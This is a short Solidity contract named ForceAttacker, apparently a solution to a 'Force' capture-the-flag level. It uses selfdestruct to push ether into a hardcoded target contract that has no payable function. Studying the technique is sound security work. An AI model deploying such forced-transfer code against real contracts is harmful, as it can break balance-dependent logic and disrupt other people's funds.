// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Force.sol";

contract ForceAttacker {
  using SafeMath for uint256;
  address payable target = payable(0x5AA416415245d77DC89275f18A109A004299bDde);

  function attack() public {
    selfdestruct(target);
  }

  receive() external payable {}
}
